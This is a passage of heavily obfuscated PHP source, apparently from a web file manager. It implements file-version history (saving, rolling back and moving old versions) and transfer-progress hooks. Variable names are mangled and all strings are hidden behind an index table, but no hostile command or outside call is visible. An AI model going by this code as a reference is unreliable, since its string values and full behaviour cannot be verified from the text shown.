$_SERVER[§Êá¸İ]; if (isset($„‰ÙØÆ“->_data[$ÔÑ¹ïÏ[1246]]) && $„‰ÙØÆ“->_data[$ÔÑ¹ïÏ[1246]]) { return; } $Şö½õĞ = $„‰ÙØÆ“->getPathOuter($Öúíú—); $•ª¨ÅÔº = self::parsePath($Şö½õĞ); if (!$•ª¨ÅÔº) { return; } self::add($•ª¨ÅÔº); } public static function eventBeforeRename($Œö–†ªÀ) { $µÊ®¹“ =& $_SERVER[§Êá¸İ]; $‘ÚãÚŞã = self::parsePath($Œö–†ªÀ[0]); if (!$‘ÚãÚŞã) { return; } $¸„¶Áâ˜ = self::checkInHistory($‘ÚãÚŞã); if (!$¸„¶Áâ˜) { return; } if ($¸„¶Áâ˜[$µÊ®¹“[33]] == $µÊ®¹“[230]) { $£ªæÒÁ£ = self::listData($‘ÚãÚŞã); if ($£ªæÒÁ£ && $£ªæÒÁ£[$µÊ®¹“[445]]) { self::moveHistory($‘ÚãÚŞã, $Œö–†ªÀ[1]); } } else { IO::rename($¸„¶Áâ˜[$µÊ®¹“[87]], $Œö–†ªÀ[1]); } } public static function eventBeforeMove($å¹şı¾) { $µşéèÛ =& $_SERVER[§Êá¸İ]; $½àŞà¦Ş = self::parsePath($å¹şı¾[0]); if (!$½àŞà¦Ş) { return; } $©¶°­Øö = self::parsePath($å¹şı¾[1]); if (!$©¶°­Øö) { return; } $áÀÀ ¨Ç = $å¹şı¾[3]; $ÜÏö¤¯Å = self::checkInHistory($½àŞà¦Ş); if (!$ÜÏö¤¯Å) { return; } $ß«î¼Ø = self::pathHistory($©¶°­Øö); if ($ÜÏö¤¯Å[$µşéèÛ[33]] == $µşéèÛ[230]) { $öúâĞåÁ = self::listData($½àŞà¦Ş); $„¬ÕÔâó = rtrim($©¶°­Øö, $µşéèÛ[8]) . $µşéèÛ[8] . ($áÀÀ ¨Ç ? $áÀÀ ¨Ç : get_path_this($½àŞà¦Ş)); $²Ó“©ô– = self::listData($„¬ÕÔâó); if ($öúâĞåÁ && $öúâĞåÁ[$µşéèÛ[445]] && $²Ó“©ô– && $²Ó“©ô–[$µşéèÛ[445]]) { return self::clear($½àŞà¦Ş); } if ($öúâĞåÁ && $öúâĞåÁ[$µşéèÛ[445]]) { self::moveHistory($½àŞà¦Ş, $áÀÀ ¨Ç, $ß«î¼Ø); } } else { IO::move($ÜÏö¤¯Å[$µşéèÛ[87]], $ß«î¼Ø, !1, $áÀÀ ¨Ç); self::clearEmptyFolder(IO::pathFather($ÜÏö¤¯Å[$µşéèÛ[87]])); } } public static function eventAfterRemove($³ÂÓ¸Ù—, $ªú´»¿ì) { $Œ¸õÃà =& $_SERVER[§Êá¸İ]; if (!$ªú´»¿ì) { return; } $õü”÷ï = self::parsePath($³ÂÓ¸Ù—[0]); if (!$õü”÷ï) { return; } $ùûÜš¥à = self::checkInHistory($õü”÷ï); if (!$ùûÜš¥à) { return; } if ($ùûÜš¥à[$Œ¸õÃà[33]] == $Œ¸õÃà[230]) { $öÁÉ½ê‚ = self::listData($õü”÷ï, !1); if ($öÁÉ½ê‚ && $öÁÉ½ê‚[$Œ¸õÃà[445]]) { self::clear($õü”÷ï, !1); } } else { IO::remove($ùûÜš¥à[$Œ¸õÃà[87]]); self::clearEmptyFolder(IO::pathFather($ùûÜš¥à[$Œ¸õÃà[87]])); } } private static function checkInHistory($ÅÓ¼£•) { $ÅÇƒÁ¢ = self::pathHistory($ÅÓ¼£•); if (!IO::exist($ÅÇƒÁ¢)) { $ÅÇƒÁ¢ .= $_SERVER[§Êá¸İ][1326]; } return IO::exist($ÅÇƒÁ¢) ? IO::info($ÅÇƒÁ¢) : !1; } private static function parsePath($Âï¶Ü€£) { $¤‘¢œ•‡ =& $_SERVER[§Êá¸İ]; if (!$Âï¶Ü€£) { return !1; } if (isset($GLOBALS[$¤‘¢œ•‡[1327]]) && $GLOBALS[$¤‘¢œ•‡[1327]]) { return; } $ûçù°ÈĞ = KodIO::parse($Âï¶Ü€£); $Çï§¾•× = $ûçù°ÈĞ[$¤‘¢œ•‡[33]]; $Ş†‘Ë„æ = !$Çï§¾•× || $Çï§¾•× == KodIO::KOD_IO || $Çï§¾•× == KodIO::KOD_SHARE_ITEM; if (!$Ş†‘Ë„æ || !$ûçù°ÈĞ[$¤‘¢œ•‡[1328]]) { return !1; } if (substr($Âï¶Ü€£, 0, strlen(DATA_PATH . $¤‘¢œ•‡[1329])) == DATA_PATH . $¤‘¢œ•‡[1329]) { return !1; } if ($Çï§¾•× == KodIO::KOD_SHARE_ITEM) { $°âïŠ = IO::init($Âï¶Ü€£); if ($°âïŠ->pathParse[$¤‘¢œ•‡[1242]]) { return self::parsePath($°âïŠ->pathParse[$¤‘¢œ•‡[1242]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $÷‚ÕÆûÇ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¤‘¢œ•‡[1330]); foreach ($÷‚ÕÆûÇ as $ĞÍ¸²Ú) { if (!$Çï§¾•× && substr($Âï¶Ü€£, 0, strlen($ĞÍ¸²Ú)) == $ĞÍ¸²Ú) { return !1; } } self::log($GLOBALS[$¤‘¢œ•‡[1237]] . $¤‘¢œ•‡[1331] . $Âï¶Ü€£); return $Âï¶Ü€£; } private static function pathHistory($ú¬Ë›¤) { $’ŸŒş¸ =& $_SERVER[§Êá¸İ]; $ŠÃÙâµ­ = self::$_historyBase . ltrim(KodIO::clear($ú¬Ë›¤), $’ŸŒş¸[8]); $ŠÃÙâµ­ = str_replace(array($’ŸŒş¸[1332]), array($’ŸŒş¸[1333]), $ŠÃÙâµ­); return $ŠÃÙâµ­; } public static function log($‡Üæ†—•) { } public static function historyCount($ÈÙˆØË“) { $ª„ø·Èğ =& $_SERVER[§Êá¸İ]; $Úé”™„ = array(); $ÄíŠ•ûø = array(); foreach ($ÈÙˆØË“ as $´¦¸Ÿå) { $ÛèîÁŠ± = get_path_father($´¦¸Ÿå); if (!$ÄíŠ•ûø[$ÛèîÁŠ±]) { $ÄíŠ•ûø[$ÛèîÁŠ±] = array(); } $ÄíŠ•ûø[$ÛèîÁŠ±][] = get_path_this($´¦¸Ÿå); } foreach ($ÄíŠ•ûø as $ÛèîÁŠ± => $ÏûÚ§ïı) { $á›ÚúãŒ = self::parsePath($ÛèîÁŠ±); if (!$á›ÚúãŒ) { continue; } foreach ($ÏûÚ§ïı as $’‰Ó”¿ò) { $×ìş = self::listData(rtrim($á›ÚúãŒ, $ª„ø·Èğ[8]) . $ª„ø·Èğ[8] . $’‰Ó”¿ò, !1); if ($×ìş && $×ìş[$ª„ø·Èğ[445]]) { $Úé”™„[rtrim($ÛèîÁŠ±, $ª„ø·Èğ[8]) . $ª„ø·Èğ[8] . $’‰Ó”¿ò] = count($×ìş[$ª„ø·Èğ[445]]); } } } return $Úé”™„; } public static function add($‘ª‚¹Ÿ) { $¨µ£âÈÃ =& $_SERVER[§Êá¸İ]; $±âòí¾÷ = self::listData($‘ª‚¹Ÿ); if (!$±âòí¾÷) { return; } $³ğîğ´ = Model($¨µ£âÈÃ[857])->get($¨µ£âÈÃ[1334]); $™ı‘’¼ = intval($GLOBALS[$¨µ£âÈÃ[6]][$¨µ£âÈÃ[92]][$¨µ£âÈÃ[1312]]); $áû›é™ = $³ğîğ´ == $¨µ£âÈÃ[1335] ? min(5, $™ı‘’¼) : $™ı‘’¼; if ($™ı‘’¼ <= 0) { return; } $ê™ıÙá¬ = IO::info($‘ª‚¹Ÿ); $Å«¦ò·Ä = $±âòí¾÷[$¨µ£âÈÃ[445]]; if ($ê™ıÙá¬[$¨µ£âÈÃ[79]] == 0) { return; } if ($ê™ıÙá¬[$¨µ£âÈÃ[79]] >= 1024 * 1024 * 500) { return !1; } $Ó÷ªœğ = IO::hashSimple($‘ª‚¹Ÿ); if ($Å«¦ò·Ä && $Å«¦ò·Ä[0][$¨µ£âÈÃ[680]] == $Ó÷ªœğ) { return !0; } if (array_key_exists($¨µ£âÈÃ[233], $ê™ıÙá¬) && !$ê™ıÙá¬[$¨µ£âÈÃ[233]]) { return !1; } $äüú¬ş» = short_id(time()); $áã¦É½‹ = array($¨µ£âÈÃ[483] => $äüú¬ş», $¨µ£âÈÃ[680] => $Ó÷ªœğ, $¨µ£âÈÃ[32] => $ê™ıÙá¬[$¨µ£âÈÃ[32]] . $¨µ£âÈÃ[10] . date($¨µ£âÈÃ[1336]) . rand_string(1), $¨µ£âÈÃ[79] => $ê™ıÙá¬[$¨µ£âÈÃ[79]], $¨µ£âÈÃ[535] => USER_ID, $¨µ£âÈÃ[231] => time(), $¨µ£âÈÃ[1337] => $¨µ£âÈÃ[12]); IO::mkdir($±âòí¾÷[$¨µ£âÈÃ[1338]]); $å±÷Úí¯ = IO::copy($‘ª‚¹Ÿ, $±âòí¾÷[$¨µ£âÈÃ[1338]], !1, $áã¦É½‹[$¨µ£âÈÃ[32]]); if (!$å±÷Úí¯) { self::clearEmptyFolder($±âòí¾÷[$¨µ£âÈÃ[1338]]); return !1; } array_unshift($Å«¦ò·Ä, $áã¦É½‹); if (count($Å«¦ò·Ä) > $áû›é™) { $€¸ƒâı¨ = array_slice($Å«¦ò·Ä, $áû›é™); foreach ($€¸ƒâı¨ as $šÛçµ€½) { IO::remove($±âòí¾÷[$¨µ£âÈÃ[1338]] . $šÛçµ€½[$¨µ£âÈÃ[32]]); } $Å«¦ò·Ä = array_slice($Å«¦ò·Ä, 0, $áû›é™); } return self::saveData($±âòí¾÷[$¨µ£âÈÃ[1339]], $Å«¦ò·Ä); } public static function remove($™º™ş , $ÂèöĞÌ¢) { $²¨ê³‚ƒ =& $_SERVER[§Êá¸İ]; $Ø›ïÉËÏ = self::listData($™º™ş ); $Ú¶¼–™¾ = array(); if (!$Ø›ïÉËÏ) { return !1; } foreach ($Ø›ïÉËÏ[$²¨ê³‚ƒ[445]] as $ãş½û) { if ($ãş½û[$²¨ê³‚ƒ[483]] == $ÂèöĞÌ¢) { IO::remove($Ø›ïÉËÏ[$²¨ê³‚ƒ[1338]] . $ãş½û[$²¨ê³‚ƒ[32]]); continue; } $Ú¶¼–™¾[] = $ãş½û; } return self::saveData($Ø›ïÉËÏ[$²¨ê³‚ƒ[1339]], $Ú¶¼–™¾); } public static function clear($ò¿é¯ó›, $¢ñœõ‚š = true) { $Íó§¸õÍ =& $_SERVER[§Êá¸İ]; $´Ñ‘¤› = self::listData($ò¿é¯ó›, $¢ñœõ‚š); if (!$´Ñ‘¤›) { return !1; } foreach ($´Ñ‘¤›[$Íó§¸õÍ[445]] as $ïµ„ßÄ¨) { IO::remove($´Ñ‘¤›[$Íó§¸õÍ[1338]] . $ïµ„ßÄ¨[$Íó§¸õÍ[32]]); } return self::saveData($´Ñ‘¤›[$Íó§¸õÍ[1339]], array()); } public static function moveHistory($œ¦ÊŒîì, $——§ò€­ = '', $ÎíğŒ„÷ = '') { $óö¤Ì¾¼ =& $_SERVER[§Êá¸İ]; $Âì›çäÕ = self::listData($œ¦ÊŒîì, !1); if (!$Âì›çäÕ || !$Âì›çäÕ[$óö¤Ì¾¼[445]]) { return !1; } $ÌÏ‘Ù = $óö¤Ì¾¼[1326]; $——§ò€­ = $——§ò€­ ? $——§ò€­ : get_path_this($œ¦ÊŒîì); $ÎíğŒ„÷ = $ÎíğŒ„÷ ? $ÎíğŒ„÷ : $Âì›çäÕ[$óö¤Ì¾¼[1338]]; $êäÙùˆÖ = substr(get_path_this($Âì›çäÕ[$óö¤Ì¾¼[1339]]), 0, -strlen($ÌÏ‘Ù)); foreach ($Âì›çäÕ[$óö¤Ì¾¼[445]] as $·¥İ§ => $í¹ì¥›¸) { $‰³¯£ = $——§ò€­ . substr($í¹ì¥›¸[$óö¤Ì¾¼[32]], strlen($êäÙùˆÖ)); $ èÇËÎÔ = IO::move($Âì›çäÕ[$óö¤Ì¾¼[1338]] . $í¹ì¥›¸[$óö¤Ì¾¼[32]], $ÎíğŒ„÷, !1, $‰³¯£); if ($ èÇËÎÔ) { $Âì›çäÕ[$óö¤Ì¾¼[445]][$·¥İ§][$óö¤Ì¾¼[32]] = $‰³¯£; } } $Âì›çäÕ[$óö¤Ì¾¼[1339]] = IO::move($Âì›çäÕ[$óö¤Ì¾¼[1339]], $ÎíğŒ„÷, !1, $——§ò€­ . $ÌÏ‘Ù); self::saveData($Âì›çäÕ[$óö¤Ì¾¼[1339]], $Âì›çäÕ[$óö¤Ì¾¼[445]]); self::clearEmptyFolder($Âì›çäÕ[$óö¤Ì¾¼[1338]]); } public static function rollback($²ÅÛÖ¶ş, $ç¦¥ÆÛİ) { $³Ÿ¶Ï´ =& $_SERVER[§Êá¸İ]; $“÷æ„ìˆ = self::listData($²ÅÛÖ¶ş); if (!$“÷æ„ìˆ) { return; } $‚ßÆÔŞ‰ = IO::info($²ÅÛÖ¶ş); foreach ($“÷æ„ìˆ[$³Ÿ¶Ï´[445]] as $¥ÃêÈŞæ => $¾º¯ˆ×È) { if ($¾º¯ˆ×È[$³Ÿ¶Ï´[483]] == $ç¦¥ÆÛİ) { self::add($²ÅÛÖ¶ş); $èáŞ¼úÁ = $“÷æ„ìˆ[$³Ÿ¶Ï´[1338]] . $¾º¯ˆ×È[$³Ÿ¶Ï´[32]]; $îœÃí‡– = IO::copy($èáŞ¼úÁ, IO::pathFather($²ÅÛÖ¶ş), REPEAT_REPLACE, $‚ßÆÔŞ‰[$³Ÿ¶Ï´[32]]); if ($îœÃí‡–) { self::remove($²ÅÛÖ¶ş, $ç¦¥ÆÛİ); } return $îœÃí‡–; } } return !1; } public static function setDetail($Å¢ï•ùã, $©§ˆËÀ¾, $¯ñøæãÏ) { $’Æã‰ˆš =& $_SERVER[§Êá¸İ]; $ËÁ¢Ìµ = self::listData($Å¢ï•ùã); if (!$ËÁ¢Ìµ) { return; } foreach ($ËÁ¢Ìµ[$’Æã‰ˆš[445]] as $ß©ÎÛÄ => $ÆÈĞĞá”) { if ($ÆÈĞĞá”[$’Æã‰ˆš[483]] == $©§ˆËÀ¾) { $ËÁ¢Ìµ[$’Æã‰ˆš[445]][$ß©ÎÛÄ][$’Æã‰ˆš[1337]] = $¯ñøæãÏ; self::saveData($ËÁ¢Ìµ[$’Æã‰ˆš[1339]], $ËÁ¢Ìµ[$’Æã‰ˆš[445]]); return !0; } } return !1; } public static function fileInfo($Åéö¿È¿, $ßÉö®) { $Íê²¿óâ =& $_SERVER[§Êá¸İ]; $ñ‘£Î³ = self::listData($Åéö¿È¿); if (!$ñ‘£Î³) { show_json(LNG($Íê²¿óâ[108]), !1); } $·‰×ñÙË = $Íê²¿óâ[12]; foreach ($ñ‘£Î³[$Íê²¿óâ[445]] as $´ùæû¿ => $õ“ ˜²Ï) { if ($õ“ ˜²Ï[$Íê²¿óâ[483]] != $ßÉö®) { continue; } $·‰×ñÙË = $ñ‘£Î³[$Íê²¿óâ[1338]] . $õ“ ˜²Ï[$Íê²¿óâ[32]]; break; } if (!$·‰×ñÙË) { show_json(LNG($Íê²¿óâ[108]), !1); } return IO::info($·‰×ñÙË); } public static function fileOut($Ş’ş«®İ, $»Î–åÆ¥, $Õ§ïßèÔ = false) { $ˆöÚø™Ô =& $_SERVER[§Êá¸İ]; $Ñä£ÇùÆ = self::fileInfo($Ş’ş«®İ, $»Î–åÆ¥); $«õµªÓÕ =& $GLOBALS[$ˆöÚø™Ô[7]]; $Õ§ïßèÔ = isset($«õµªÓÕ[$ˆöÚø™Ô[1289]]) && $«õµªÓÕ[$ˆöÚø™Ô[1289]] == 1; if (isset($«õµªÓÕ[$ˆöÚø™Ô[33]]) && $«õµªÓÕ[$ˆöÚø™Ô[33]] == $ˆöÚø™Ô[1340]) { return IO::fileOutImage($Ñä£ÇùÆ[$ˆöÚø™Ô[87]], $«õµªÓÕ[$ˆöÚø™Ô[1341]]); } IO::fileOut($Ñä£ÇùÆ[$ˆöÚø™Ô[87]], $Õ§ïßèÔ, get_path_this($Ş’ş«®İ)); } public static function listData($§™Äóş•, $‡Æç½…… = true) { $–¥Ÿ™ö =& $_SERVER[§Êá¸İ]; if ($‡Æç½…… && !IO::exist($§™Äóş•)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($§™Äóş•, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $²©ŒÚ½ = self::pathHistory($§™Äóş•); $ûœôßºô = array($–¥Ÿ™ö[1339] => $²©ŒÚ½ . $–¥Ÿ™ö[1326], $–¥Ÿ™ö[1338] => rtrim(get_path_father($²©ŒÚ½), $–¥Ÿ™ö[8]) . $–¥Ÿ™ö[8], $–¥Ÿ™ö[445] => array()); $Œ’µõî± = IO::getContent($ûœôßºô[$–¥Ÿ™ö[1339]]); if ($Œ’µõî±) { $‡Ûô†³ = json_decode($Œ’µõî±, !0); if (is_array($‡Ûô†³)) { $ûœôßºô[$–¥Ÿ™ö[445]] = $‡Ûô†³; } } return $ûœôßºô; } private static function saveData($ÅÓ‚Õ–, $ÌÜ›–Å) { $™ÓÛÚ„¥ =& $_SERVER[§Êá¸İ]; self::log($™ÓÛÚ„¥[1342] . $ÅÓ‚Õ– . $™ÓÛÚ„¥[74] . count($ÌÜ›–Å), $™ÓÛÚ„¥[839]); if ($ÌÜ›–Å) { return IO::setContent($ÅÓ‚Õ–, json_encode($ÌÜ›–Å)); } $ÁÓâáö = IO::pathFather($ÅÓ‚Õ–); IO::remove($ÅÓ‚Õ–); self::clearEmptyFolder($ÁÓâáö); return !0; } public static function clearEmptyFolder($¦Ò˜Ò») { $’Åí°§¸ =& $_SERVER[§Êá¸İ]; if (trim($¦Ò˜Ò», $’Åí°§¸[8]) == trim(self::$_historyBase, $’Åí°§¸[8])) { return; } $îãıÀŠ  = IO::pathFather($¦Ò˜Ò»); $æåÖô¼ù = IO::has($¦Ò˜Ò», !0); if ($æåÖô¼ù[$’Åí°§¸[239]] > 0 || $æåÖô¼ù[$’Åí°§¸[240]] > 0) { return; } IO::remove($¦Ò˜Ò»); self::clearEmptyFolder($îãıÀŠ ); } private static function getBasePath() { $§šÑÌ° =& $_SERVER[§Êá¸İ]; $ˆ€ßèû = Model($§šÑÌ°[1343])->get($§šÑÌ°[1344]); if ($ˆ€ßèû) { if (!IO::exist($ˆ€ßèû)) { IO::mkdir($ˆ€ßèû); } if (get_path_this($ˆ€ßèû) == $§šÑÌ°[1329]) { $²ø…–ø• = $§šÑÌ°[1345] . rand_string(8); @rename($ˆ€ßèû, get_path_father($ˆ€ßèû) . $§šÑÌ°[8] . $²ø…–ø•); $ˆ€ßèû = DATA_PATH . $²ø…–ø• . $§šÑÌ°[8]; file_put_contents(DATA_PATH . $§šÑÌ°[1276], $§šÑÌ°[12]); Model($§šÑÌ°[1343])->set($§šÑÌ°[1344], $ˆ€ßèû); } return $ˆ€ßèû; } $ˆ€ßèû = DATA_PATH . $§šÑÌ°[1345] . rand_string(8) . $§šÑÌ°[8]; $ˆ€ßèû = IO::mkdir($ˆ€ßèû); $ˆ€ßèû = rtrim($ˆ€ßèû, $§šÑÌ°[8]) . $§šÑÌ°[8]; file_put_contents($ˆ€ßèû . $§šÑÌ°[1276], $§šÑÌ°[12]); file_put_contents(DATA_PATH . $§šÑÌ°[1276], $§šÑÌ°[12]); Model($§šÑÌ°[1343])->set($§šÑÌ°[1344], $ˆ€ßèû); return $ˆ€ßèû; } } goto dùÎ³ğÏƒÊ; f£íƒóÆ•¶: class TaskFileTransfer extends Task { protected function startAfter() { $ßËÛ‰Ú =& $_SERVER[§Êá¸İ]; $èï´³ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ßËÛ‰Ú[1809], array($this, $ßËÛ‰Ú[1810])); Hook::bind($ßËÛ‰Ú[1318], array($this, $ßËÛ‰Ú[1811])); Hook::bind($ßËÛ‰Ú[1812], array($this, $ßËÛ‰Ú[1813])); Hook::bind($ßËÛ‰Ú[676], array($this, $ßËÛ‰Ú[1814])); Hook::bind($ßËÛ‰Ú[677], array($this, $ßËÛ‰Ú[1815])); Hook::bind($ßËÛ‰Ú[683], array($this, $ßËÛ‰Ú[1816])); Hook::bind($ßËÛ‰Ú[684], array($this, $ßËÛ‰Ú[1817])); Hook::bind($ßËÛ‰Ú[679], array($this, $ßËÛ‰Ú[1818])); Hook::bind($ßËÛ‰Ú[681], array($this, $ßËÛ‰Ú[1819])); Hook::bind($ßËÛ‰Ú[645], array($this, $ßËÛ‰Ú[1820])); Hook::bind($ßËÛ‰Ú[642], array($this, $ßËÛ‰Ú[1820])); Hook::bind($ßËÛ‰Ú[647], array($this, $ßËÛ‰Ú[1820])); Hook::bind($ßËÛ‰Ú[649], array($this, $ßËÛ‰Ú[1820])); Hook::bind($ßËÛ‰Ú[651], array($this, $ßËÛ‰Ú[1820])); Hook::bind($ßËÛ‰Ú[1821], array($this, $ßËÛ‰Ú[1822])); Hook::bind($ßËÛ‰Ú[667], array($this, $ßËÛ‰Ú[1823])); $this->sourceModelCopyFlag = !1; Hook::bind($ßËÛ‰Ú[1824], array($this, $ßËÛ‰Ú[1825])); Hook::bind($ßËÛ‰Ú[1826], array($this, $ßËÛ‰Ú[1827])); Hook::bind($ßËÛ‰Ú[1828], array($this, $ßËÛ‰Ú[1829])); $èï´³[$ßËÛ‰Ú[1830]] = LNG($ßËÛ‰Ú[1831]); $èï´³[$ßËÛ‰Ú[1832]] = 0; $èï´³[$ßËÛ‰Ú[1833]] = 0; $èï´³[$ßËÛ‰Ú[1153]] = $ßËÛ‰Ú[12]; $èï´³[$ßËÛ‰Ú[1834]] = $ßËÛ‰Ú[12]; $èï´³[$ßËÛ‰Ú[1835]] = 0; $èï´³[$ßËÛ‰Ú[1836]] = 0; $èï´³[$ßËÛ‰Ú[1837]] = 0; if (!$èï´³[$ßËÛ‰Ú[1668]]) { $èï´³[$ßËÛ‰Ú[1668]] = LNG($ßËÛ‰Ú[1838]); } } protected function endAfter() { $ ·€¦‚ê =& $_SERVER[§Êá¸İ]; Hook::unbind($ ·€¦‚ê[1809], array($this, $ ·€¦‚ê[1810])); Hook::unbind($ ·€¦‚ê[1318], array($this, $ ·€¦‚ê[1811])); Hook::unbind($ ·€¦‚ê[1812], array($this, $ ·€¦‚ê[1813])); Hook::unbind($ ·€¦‚ê[676], array($this, $ ·€¦‚ê[1814])); Hook::unbind($ ·€¦‚ê[677], array($this, $ ·€¦‚ê[1815])); Hook::unbind($ ·€¦‚ê[683], array($this, $ ·€¦‚ê[1816])); Hook::unbind($ ·€¦‚ê[684], array($this, $ ·€¦‚ê[1817])); Hook::unbind($ ·€¦‚ê[679], array($this, $ ·€¦‚ê[1818])); Hook::unbind($ ·€¦‚ê[681], array($this, $ ·€¦‚ê[1819])); Hook::unbind($ ·€¦‚ê[645], array($this, $ ·€¦‚ê[1820])); Hook::unbind($ ·€¦‚ê[642], array($this, $ ·€¦‚ê[1820])); Hook::unbind($ ·€¦‚ê[647], array($this, $ ·€¦‚ê[1820])); Hook::unbind($ ·€¦‚ê[649], array($this, $ ·€¦‚ê[1820])); Hook::unbind($ ·€¦‚ê[651], array($this, $ ·€¦‚ê[1820])); Hook::unbind($ ·€¦‚ê[1821], array($this, $ ·€¦‚ê[1822])); Hook::unbind($ ·€¦‚ê[667], array($this, $ ·€¦‚ê[1823])); Hook::unbind($ ·€¦‚ê[1824], array($this, $ ·€¦‚ê[1825])); Hook::unbind($ ·€¦‚ê[1826], array($this, $ ·€¦‚ê[1827])); Hook::unbind($ ·€¦‚ê[1828], array($this, $ ·€¦‚ê[1829])); } public function copyMoveStart($°ÖƒÕó, $‚§êà, $Ì½¸Ò¸ø, $‹« ±ÍÈ) { $ƒü“ÛËş =& $_SERVER[§Êá¸İ]; self::log($ƒü“ÛËş[1839] . $‚§êà . $ƒü“ÛËş[73] . $‹« ±ÍÈ); $÷Ûó€¼ú = rtrim(TEMP_FILES, $ƒü“ÛËş[8]); if (substr($‚§êà, 0, strlen($÷Ûó€¼ú)) == $÷Ûó€¼ú) { return; } if (substr($‹« ±ÍÈ, 0, strlen($÷Ûó€¼ú)) == $÷Ûó€¼ú) { return; } $Ãâ¯¬ùË =& $this->task; $Ãâ¯¬ùË[$ƒü“ÛËş[1840]] = KodIO::transferType($°ÖƒÕó, $Ì½¸Ò¸ø); $this->update(); } public function updateAfter() { $Â÷™Ó¢ä =& $_SERVER[§Êá¸İ]; $¥ëŒ¯Ìø =& $this->task; if (!$¥ëŒ¯Ìø[$Â÷™Ó¢ä[850]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¥ëŒ¯Ìø[$Â÷™Ó¢ä[1840]] == $Â÷™Ó¢ä[1411]) { return; } self::updateTask($¥ëŒ¯Ìø); } private static function updateTask(&$†­õ¨äè) { $“¦°îÄ =& $_SERVER[§Êá¸İ]; if ($†­õ¨äè[$“¦°îÄ[1840]] == $“¦°îÄ[1289] || $†­õ¨äè[$“¦°îÄ[1840]] == $“¦°îÄ[110]) { if ($†­õ¨äè[$“¦°îÄ[1834]]) { $†­õ¨äè[$“¦°îÄ[1837]] = $†­õ¨äè[$“¦°îÄ[1836]] + $†­õ¨äè[$“¦°îÄ[1833]]; } } else { if ($†­õ¨äè[$“¦°îÄ[1840]] == $“¦°îÄ[1412]) { if ($†­õ¨äè[$“¦°îÄ[1834]] == $“¦°îÄ[1289]) { $†­õ¨äè[$“¦°îÄ[1837]] = $†­õ¨äè[$“¦°îÄ[1836]] + $†­õ¨äè[$“¦°îÄ[1833]] * 0.5; } else { if ($†­õ¨äè[$“¦°îÄ[1834]] == $“¦°îÄ[110]) { $†­õ¨äè[$“¦°îÄ[1837]] = $†­õ¨äè[$“¦°îÄ[1836]] + $†­õ¨äè[$“¦°îÄ[1832]] * 0.5 + $†­õ¨äè[$“¦°îÄ[1833]] * 0.5; } } } } $†­õ¨äè[$“¦°îÄ[1781]] = $†­õ¨äè[$“¦°îÄ[1837]] / $†­õ¨äè[$“¦°îÄ[850]]; if ($†­õ¨äè[$“¦°îÄ[1781]] > 0) { $£ÂõÁ¥ğ = timeFloat() - $†­õ¨äè[$“¦°îÄ[1783]] - $†­õ¨äè[$“¦°îÄ[1786]]; $†­õ¨äè[$“¦°îÄ[1787]] = $£ÂõÁ¥ğ * (1 - $†­õ¨äè[$“¦°îÄ[1781]]) / $†­õ¨äè[$“¦°îÄ[1781]]; } } public function addPath($¸²şÏ•º) { $¢—¸ááä =& $_SERVER[§Êá¸İ]; if (!$¸²şÏ•º) { return; } $ê·Ø¡å =& $this->task; $éÔİ–Œ = IO::infoWithChildren($¸²şÏ•º); $¸Ù¬ú¬ò = $ê·Ø¡å[$¢—¸ááä[1841]] ? $ê·Ø¡å[$¢—¸ááä[1841]][$¢—¸ááä[1842]] : 0; $ê·Ø¡å[$¢—¸ááä[1841]] = array($¢—¸ááä[1842] => $¸Ù¬ú¬ò + 1, $¢—¸ááä[502] => $éÔİ–Œ[$¢—¸ááä[32]], $¢—¸ááä[87] => $éÔİ–Œ[$¢—¸ááä[87]], $¢—¸ááä[590] => $éÔİ–Œ[$¢—¸ááä[590]] ? $éÔİ–Œ[$¢—¸ááä[590]] : $éÔİ–Œ[$¢—¸ááä[87]]); if ($éÔİ–Œ[$¢—¸ááä[33]] == $¢—¸ááä[230]) { $ê·Ø¡å[$¢—¸ááä[1151]] += 1; } else { $ê·Ø¡å[$¢—¸ááä[1151]] += $éÔİ–Œ[$¢—¸ááä[82]][$¢—¸ááä[80]]; if ($éÔİ–Œ[$¢—¸ááä[193]]) { $ê·Ø¡å[$¢—¸ááä[1151]] += $éÔİ–Œ[$¢—¸ááä[82]][$¢—¸ááä[81]] + 1; } } $ê·Ø¡å[$¢—¸ááä[850]] += $éÔİ–Œ[$¢—¸ááä[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($­ï„Şö¹) { } public function sourceAddHashEnd($¯¯úß‰¡) { } public function sourceAddFileStart($Ùò¨—¸€) { $ËşøŸ—Ò =& $_SERVER[§Êá¸İ]; $ßÑÈƒˆ´ =& $this->task; $ßÑÈƒˆ´[$ËşøŸ—Ò[1832]] = $Ùò¨—¸€[$ËşøŸ—Ò[79]]; $ßÑÈƒˆ´[$ËşøŸ—Ò[1830]] = $Ùò¨—¸€[$ËşøŸ—Ò[32]]; $ßÑÈƒˆ´[$ËşøŸ—Ò[1153]] = $Ùò¨—¸€[$ËşøŸ—Ò[32]]; $ßÑÈƒˆ´[$ËşøŸ—Ò[1843]] = $Ùò¨—¸€[$ËşøŸ—Ò[87]]; $this->update(); } public function sourceAddFileEnd($çù¼Ğ’¹) { $·¨µà…İ =& $_SERVER[§Êá¸İ]; $á«èÃõ =& $this->task; $á«èÃõ[$·¨µà…İ[1837]] += $çù¼Ğ’¹[$·¨µà…İ[79]]; $á«èÃõ[$·¨µà…İ[1843]] = $çù¼Ğ’¹[$·¨µà…İ[87]]; $this->update(1); } public function copyFileStart($ÜÆÕè£€, $”ĞÙ¥Á, $é‚á®„Ù, $´¼üÃğ–, $ò†ô¼ì°, $õğòÙ¦) { $ŠÅ­¦€Ú =& $_SERVER[§Êá¸İ]; $Æ´Ø³¯ = $ò†ô¼ì°; if ($Æ´Ø³¯ == $GLOBALS[$ŠÅ­¦€Ú[1844]]) { $Æ´Ø³¯ = $GLOBALS[$ŠÅ­¦€Ú[1845]]; } $GLOBALS[$ŠÅ­¦€Ú[1845]] = $ò†ô¼ì°; $GLOBALS[$ŠÅ­¦€Ú[1844]] = $õğòÙ¦; $Š¡Òó¤ =& $this->task; $Š¡Òó¤[$ŠÅ­¦€Ú[1830]] = $Æ´Ø³¯; 